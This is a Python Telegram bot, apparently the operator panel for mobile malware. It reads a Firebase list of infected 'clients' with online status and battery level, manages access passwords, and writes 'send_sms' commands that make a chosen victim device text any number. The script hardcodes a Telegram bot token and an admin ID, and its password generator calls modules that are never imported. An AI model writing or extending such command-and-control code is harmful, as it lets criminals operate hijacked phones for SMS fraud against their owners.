import urllib.request, urllib.parse, json, time, os

TOKEN = '8287259277:AAEQnBmPciL5-wQProgXCrOCAFjJ-oQHmU4'
FB = 'https://yono-ad3-default-rtdb.firebaseio.com'
API = f'https://api.telegram.org/bot{TOKEN}'
ADMIN_ID = 8295208785
SVR = os.environ.get('PANEL_URL', 'http://localhost:8080')
offset = 0
waiting = False

def api_tg(m, d=None):
    u = f'{API}/{m}'
    if d: req = urllib.request.Request(u, data=urllib.parse.urlencode(d).encode())
    else: req = urllib.request.Request(u)
    return json.loads(urllib.request.urlopen(req, timeout=15).read())

def api_tg_j(m, d):
    req = urllib.request.Request(f'{API}/{m}', data=json.dumps(d).encode(), headers={'Content-Type':'application/json'})
    return json.loads(urllib.request.urlopen(req, timeout=15).read())

def api_svr(m, data=None):
    if data:
        req = urllib.request.Request(f'{SVR}{m}', data=json.dumps(data).encode(), headers={'Content-Type':'application/json'})
        return json.loads(urllib.request.urlopen(req, timeout=10).read())
    return json.loads(urllib.request.urlopen(f'{SVR}{m}', timeout=10).read())

def fb_get(p):
    try: return json.loads(urllib.request.urlopen(f'{FB}/{p}.json', timeout=10).read())
    except: return None

def fb_put(p, d):
    req = urllib.request.Request(f'{FB}/{p}.json', data=json.dumps(d).encode(), method='PUT', headers={'Content-Type':'application/json'})
    urllib.request.urlopen(req, timeout=10)

def snd(c, t, kb=None):
    d = {'chat_id':c,'text':t,'parse_mode':'Markdown'}
    if kb: d['reply_markup'] = json.dumps({'inline_keyboard':kb})
    api_tg_j('sendMessage', d)

def edt(c, mi, t, kb=None):
    d = {'chat_id':c,'message_id':mi,'text':t,'parse_mode':'Markdown'}
    if kb: d['reply_markup'] = json.dumps({'inline_keyboard':kb})
    api_tg_j('editMessageText', d)

def menu():
    return [
        [{'text':'🔑 Set Password','callback_data':'setpass'}],
        [{'text':'❌ Delete Password','callback_data':'delpass'}],
        [{'text':'📋 List Passwords','callback_data':'listpass'},
         {'text':'🕐 Active Password','callback_data':'activepass'}],
        [{'text':'📊 Stats','callback_data':'stats'}],
        [{'text':'👥 Online Devices','callback_data':'online'}],
        [{'text':'📨 Send SMS','callback_data':'sendsms'}],
    ]

def gen_pass(n=10):
    return ''.join(random.choices(string.ascii_letters+string.digits, k=n))

def hand_start(c):
    if c != ADMIN_ID: snd(c, '❌ Unauthorized'); return
    snd(c, '*Alexa Admin Bot*\n\nWelcome Admin!', menu())

def hand_setpass(c, mi):
    global waiting
    waiting = 'set'
    edt(c, mi, '✏️ *Send the new password*\n\nType the password as a text message (min 3 chars).', menu())

def hand_delpass(c, mi):
    global waiting
    waiting = True
    edt(c, mi, '✏️ *Send the password to delete*\n\nType the full password as a text message.', menu())

def hand_listpass(c, mi):
    r = api_svr('/api/passwords')
    if not r:
        edt(c, mi, '*📋 Passwords*\n\nNone set', menu()); return
    lines = ['*📋 Passwords*\n']
    for k, v in sorted(r.items(), key=lambda x: x[1].get('created',0), reverse=True):
        ts = v.get('created',0)
        t = time.strftime('%d-%m %H:%M', time.localtime(ts/1000)) if ts else '?'
        ls = v.get('last_login')
        l = time.strftime('%d-%m %H:%M', time.localtime(ls/1000)) if ls else 'never'
        dev = v.get('device','')[:20]
        lines.append(f'`{k}`\n  Created: {t} | Used: {l} | {dev}')
        if len(lines) > 25: lines.append(f'\n+{len(r)-20} more'); break
    edt(c, mi, '\n'.join(lines), menu())

def hand_activepass(c, mi):
    logs = api_svr('/api/logins')
    if not logs:
        edt(c, mi, '*🕐 Login Activity*\n\nNo login activity yet', menu()); return
    r = ['*🕐 Login Activity (last 15)*\n']
    for l in logs[-15:]:
        ts = time.strftime('%d-%m %H:%M', time.localtime(l['ts']/1000))
        ua = l.get('ua','')[:25]
        r.append(f'🔑 at {ts} | `{ua}`')
    edt(c, mi, '\n'.join(r), menu())

def hand_stats(c, mi):
    cl = fb_get('clients') or {}
    t = len(cl)
    on = sum(1 for d in cl.values() if d.get('status'))
    pwds = api_svr('/api/passwords')
    pc = len(pwds) if pwds else 0
    edt(c, mi,
        f'*📊 Stats*\n\n'
        f'Total Devices: {t}\n'
        f'Online: {on}\n'
        f'Offline: {t-on}\n'
        f'Passwords: {pc}', menu())

def hand_online(c, mi):
    cl = fb_get('clients') or {}
    on = [(k, v) for k, v in cl.items() if v.get('status')]
    r = f'*👥 Online ({len(on)})*\n\n'
    if not on: r += 'No devices online'
    else:
        for k, v in on[:20]:
            b = v.get('battery','?')
            r += f'🟢 `{k[:8]}...` Bat: {b}\n'
        if len(on) > 20: r += f'\n+{len(on)-20} more'
    edt(c, mi, r, menu())

def hand_sendsms(c, mi):
    edt(c, mi,
        '*📨 Send SMS*\n\n'
        'Send in format:\n`DEVICE_ID NUMBER MESSAGE`\n\n'
        'Example:\n`-Oa1U6WnRGYqAe9GNjfB +919876543210 Hello`', menu())

def prc_text(c, t):
    global waiting
    if waiting == 'set':
        waiting = False
        if len(t) < 3:
            snd(c, '❌ Min 3 chars. Try again from menu.')
            return
        r = api_svr('/api/setpass', {'pass': t})
        if r.get('ok'):
            snd(c, f'✅ Password set: `{t}`')
        else:
            snd(c, f'❌ {r.get("error","failed")}')
        return
    if waiting == True and len(t) >= 1:
        waiting = False
        r = api_svr('/api/delpass', {'pass': t})
        if r.get('ok'):
            snd(c, f'✅ Password deleted.\nDevice using it will be logged out within 10s.')
        else:
            snd(c, f'❌ Password not found.')
        return
    if waiting:
        waiting = False
        snd(c, '❌ Cancelled.')
        return
    parts = t.split(' ', 2)
    if len(parts) == 3 and parts[0].strip() and parts[1].strip() and parts[2].strip():
        dev, num, msg = parts
        cmd = {'action':'send_sms','deviceId':dev,'message':msg,'number':num,'timestamp':int(time.time()*1000)}
        fb_put('data/command', cmd)
        snd(c, f'✅ SMS command sent to `{dev}`')
        return
    snd(c, 'Use menu buttons below 👇', menu())

print('Bot started...')
while True:
    try:
        r = api_tg('getUpdates', {'offset':offset, 'timeout':30})
        for u in r.get('result', []):
            offset = u['update_id'] + 1
            cbq = u.get('callback_query')
            msg = u.get('message')
            if cbq:
                c = cbq['message']['chat']['id']; mi = cbq['message']['message_id']; d = cbq.get('data','')
                if c != ADMIN_ID:
                    api_tg_j('answerCallbackQuery', {'callback_query_id':cbq['id'],'text':'Unauthorized'})
                    continue
                if d == 'stats': hand_stats(c, mi)
                elif d == 'setpass': hand_setpass(c, mi)
                elif d == 'delpass': hand_delpass(c, mi)
                elif d == 'listpass': hand_listpass(c, mi)
                elif d == 'activepass': hand_activepass(c, mi)
                elif d == 'online': hand_online(c, mi)
                elif d == 'sendsms': hand_sendsms(c, mi)
                api_tg_j('answerCallbackQuery', {'callback_query_id':cbq['id']})
                continue
            if not msg: continue
            c = msg['chat']['id']
            if c != ADMIN_ID: snd(c, '❌ Unauthorized'); continue
            prc_text(c, msg.get('text',''))
    except Exception as e:
        print(f'Err: {e}')
        time.sleep(5)
